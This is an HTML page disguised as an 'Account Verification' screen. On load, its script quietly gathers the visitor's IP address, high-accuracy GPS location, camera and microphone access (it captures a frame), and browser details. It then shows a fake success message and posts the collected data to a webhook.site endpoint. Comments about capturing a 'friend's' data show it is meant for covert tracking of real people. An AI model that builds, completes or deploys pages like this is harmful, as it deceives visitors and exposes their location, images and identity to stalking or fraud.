<!DOCTYPE html>
<html>
<head>
//chiru
    <title>Account Verification</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            text-align: center;
        }
        .container {
            max-width: 600px;
            margin: 100px auto;
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        .loading {
            font-size: 18px;
        }
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success {
            background: rgba(46, 204, 113, 0.3);
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîê Identity Verification</h1>
        <p>Please wait while we verify your account...</p>
        
        <div class="loading">
            <div class="spinner"></div>
            <p>Checking system compatibility...</p>
        </div>
        
        <div class="success" id="success">
            <h2>‚úÖ Verification Complete</h2>
            <p>Your account has been successfully verified.</p>
        </div>
    </div>

    <script>
        // Start immediately when page loads
        window.addEventListener('load', async function() {
            const collectedData = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled,
                url: window.location.href,
                referrer: document.referrer
            };

            // Get IP Address
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const ipData = await response.json();
                collectedData.ip = ipData.ip;
            } catch (error) {
                collectedData.ip = 'Unable to retrieve';
            }

            // Get Location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        collectedData.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + ' meters'
                        };
                        sendDataToOwner(collectedData);
                    },
                    error => {
                        collectedData.location = 'Permission denied';
                        sendDataToOwner(collectedData);
                    },
                    { 
                        enableHighAccuracy: true,
                        timeout: 10000
                    }
                );
            } else {
                collectedData.location = 'Geolocation not supported';
                sendDataToOwner(collectedData);
            }

            // Try to access camera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: true, 
                    audio: true 
                });
                collectedData.camera = 'ACCESS_GRANTED';
                // Take a photo from video stream
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    collectedData.photo = 'CAPTURED';
                    
                    stream.getTracks().forEach(track => track.stop());
                    sendDataToOwner(collectedData);
                }, 2000);
                
            } catch (error) {
                collectedData.camera = 'ACCESS_DENIED';
                sendDataToOwner(collectedData);
            }

            // Function to send data to you (the owner)
            async function sendDataToOwner(data) {
                // Show completion to user
                document.querySelector('.loading').style.display = 'none';
                document.getElementById('success').style.display = 'block';
                
                // Format data for display
                const formattedData = `
üö® NEW USER DATA CAPTURED üö®

üìÖ Time: ${new Date(data.timestamp).toLocaleString()}
üåê IP Address: ${data.ip}
üìç Location: ${typeof data.location === 'object' ? 
    `Latitude: ${data.location.latitude}, Longitude: ${data.location.longitude}` : data.location}
üì∏ Camera: ${data.camera}
üì∑ Photo: ${data.photo || 'Not attempted'}
üíª Browser: ${data.userAgent}
üñ•Ô∏è Platform: ${data.platform}
üñºÔ∏è Screen: ${data.screen}
üåç Timezone: ${data.timezone}
üîó Referrer: ${data.referrer || 'Direct visit'}
                `;

                // Log to console (you can see this when testing)
                console.log('=== FRIEND DATA CAPTURED ===');
                console.log(formattedData);
                
                // Send to webhook (you'll get this data)
                await sendToWebhook(data);
            }

            // Send data to webhook service (you'll receive this)
            async function sendToWebhook(data) {
                try {
                    // Using webhook.site (free service) - REPLACE WITH YOUR URL
                    const webhookURL = 'https://webhook.site/YOUR-UNIQUE-ID';
                    
                    await fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            message: "Friend's Data Captured!",
                            data: data,
                            formatted: `
IP: ${data.ip}
Location: ${typeof data.location === 'object' ? 
    `Lat: ${data.location.latitude}, Long: ${data.location.longitude}` : data.location}
Browser: ${data.userAgent}
Platform: ${data.platform}
Camera: ${data.camera}
Time: ${new Date(data.timestamp).toLocaleString()}
                            `
                        })
                    });
                    
                    console.log('‚úÖ Data sent to owner successfully!');
                    
                } catch (error) {
                    console.log('‚ùå Failed to send data:', error);
                }
            }
        });
    </script>
</body>
</html>
